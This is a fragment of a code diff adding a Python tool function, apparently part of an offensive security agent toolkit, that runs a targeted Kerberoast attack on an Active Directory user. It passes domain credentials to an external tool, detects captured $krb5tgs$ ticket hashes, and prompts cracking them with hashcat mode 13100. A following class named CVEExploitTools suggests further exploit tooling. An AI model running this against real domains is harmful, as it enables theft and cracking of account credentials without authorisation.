+            "-d",
+            domain,
+            "-u",
+            username,
+            "-p",
+            password,
+            "--dc-ip",
+            dc_ip,
+            "-t",
+            target_user,
+        ]
+
+        try:
+            logger.info(f"[*] Performing targeted Kerberoast on {target_user}")
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if "$krb5tgs$" in result:
+                logger.info("[+] Targeted Kerberoast successful - hash obtained!")
+                result = (
+                    f"🚨 KERBEROAST HASH OBTAINED FOR {target_user}!\n"
+                    "→ Use crack_with_hashcat with mode 13100 to crack\n"
+                    "→ SPN will be automatically cleaned up\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"Targeted Kerberoast failed: {e}"
 
 
 class CVEExploitTools(Toolset):
